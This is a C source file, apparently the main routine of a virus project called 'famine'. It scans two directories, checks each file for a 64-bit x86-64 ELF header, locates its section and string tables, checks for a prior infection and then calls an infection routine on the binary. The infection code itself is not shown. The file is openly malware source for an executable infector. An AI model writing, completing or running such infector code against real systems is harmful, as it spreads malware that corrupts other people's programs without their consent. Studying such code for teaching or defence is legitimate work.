#include "../incl/famine.h"

int ft_readelf(t_famine *famine)
{
    famine->elf = mmap(NULL, famine->file_info.st_size, PROT_READ, MAP_PRIVATE, famine->fd, 0);
    if (famine->elf == MAP_FAILED)
    {
        close(famine->fd);
        return (-1);
    }
    if (famine->file_info.st_size >= 4 && famine->elf[0] == 0x7F && famine->elf[1] == 'E' && famine->elf[2] == 'L' && famine->elf[3] == 'F')
    {
        famine->type = 1;
        famine->file_size = famine->file_info.st_size;
        famine->header = (Elf64_Ehdr *)famine->elf;
        if ((famine->header->e_ident[EI_CLASS] == ELFCLASS64) && (famine->header->e_machine == EM_X86_64))
            famine->valid = 1;
        else
        {
            famine->valid = 0;
            close(famine->fd);
            return (-1);
        }
    }
    else
    {
        close(famine->fd);
        return (-1);
    }
    return (0);
}

int ft_checkarg(t_famine *famine)
{
    famine->fd = open(famine->binary, O_RDONLY);
    if (famine->fd == -1)
        return(errno == EISDIR ? -2 : -1);
    if (fstat(famine->fd, &famine->file_info) == -1)
    {
        close(famine->fd);
        return (-1);
    }
    if (S_ISDIR(famine->file_info.st_mode))
    {
        close(famine->fd);
        return (-1);
    }
    return (ft_readelf(famine));
}

int main()
{
    t_famine    *famine;
    char        path[1024];
    int         i = 0;

    famine = malloc(sizeof(t_famine));
    if (!famine)
        return (1);
    while (i < 2)
    {
        famine->dir = opendir(ft_getdir(i));
        while ((famine->readdir = readdir(famine->dir)) != NULL)
        {
            snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), famine->readdir->d_name);
            if (famine->readdir->d_name[0] == '.')
                continue;
            famine->binary = path; 
            if (ft_checkarg(famine))
                continue;
            ft_pointer_section_table(famine);
            ft_pointer_strings_table(famine);
            if (ft_detect_prev_infection(famine))
                ft_infect(famine);
        }
        closedir(famine->dir);
        i++;
    }
    free(famine);
    return (0);
}